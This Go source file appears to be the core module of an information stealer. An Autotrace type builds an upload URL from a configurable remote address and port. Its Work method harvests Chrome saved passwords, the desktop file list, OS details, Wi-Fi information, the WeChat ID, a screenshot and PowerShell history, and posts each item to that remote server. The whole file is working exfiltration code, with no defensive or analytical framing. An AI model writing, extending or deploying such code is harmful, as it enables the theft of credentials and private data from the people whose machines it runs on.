package work

import (
	"generate/core/postback"
	"generate/pool/Desktop"
	"generate/pool/Wifi"
	"generate/pool/chromePwd"
	"generate/pool/osinfo"
	"generate/pool/powershellHistory"
	"generate/pool/screenshot"
	"generate/pool/wechat"
	"log"
	"sync"
)

type Autotrace struct {
	remoteAddr string
	remotePort string
	reportUrl	string
}

func (self *Autotrace)setupRemoteURL(){
	self.reportUrl = "http://"+self.remoteAddr+":"+self.remotePort+"/upload"
}

func (self *Autotrace)SetupRemoteAddr(remoteAddr string){
	self.remoteAddr = remoteAddr
}

func (self *Autotrace)SetupRemotePort(remotePort string){
	self.remotePort = remotePort
}

func (self *Autotrace)Work(){
	var wg sync.WaitGroup
	self.setupRemoteURL()


	wg.Add(1)
	go func() {
		chromePwdInfo,err := chromePwd.GetChromePwd()
		if err == nil{
			postback2 := &postback.HttpPostback{}
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("ChromePwd")
			postback2.Content = []byte(chromePwdInfo)
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		desktopInfo := Desktop.GetDesktopFilelist()
		if desktopInfo != ""{
			postback2 := &postback.HttpPostback{}
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("Desktop")
			postback2.Content = []byte(desktopInfo)
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		osInfo := osinfo.GetOSInformation()
		if osInfo != ""{
			postback2 := &postback.HttpPostback{}
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("osInfo")
			postback2.Content = []byte(osInfo)
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		wifi := &Wifi.WifiCounter{}
		Personal,_:=getPersonal()
		wifi.SetShellPath(Personal)

		wifiInfo,err := wifi.GetWifiInfo()
		if err == nil {
			postback2 := &postback.HttpPostback{}
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("wifiInfo")
			postback2.Content = wifiInfo
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		Wechat := &wechat.WechatCounter{}
		Wechat.SetResourcePath()
		WechatId := Wechat.GetWxID()
		Wechat.Wxid2Qrcode(WechatId)
		log.Print("WechatId:",WechatId)
		if WechatId != "" {
			postback2 := &postback.HttpPostback{}
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("WechatId")
			postback2.Content = []byte(WechatId)
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		ScreenShotContent:= screenshot.ScreenShot()
		if ScreenShotContent != nil {
			postback2 := &postback.HttpPostback{}
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("ScreenShot")
			postback2.Content = ScreenShotContent
			postback2.PostContent()
		}
		wg.Done()
	}()

	wg.Add(1)
	go func() {
		PowershellHistory := powershellHistory.GetPowershellHistory()
		if PowershellHistory != "" {
			postback2 := &postback.HttpPostback{}
			postback2.SetTargetUrl(self.reportUrl)
			postback2.SetFileName("PowershellHistory")
			postback2.Content = []byte(PowershellHistory)
			postback2.PostContent()
		}
		wg.Done()
	}()


	wg.Wait()

}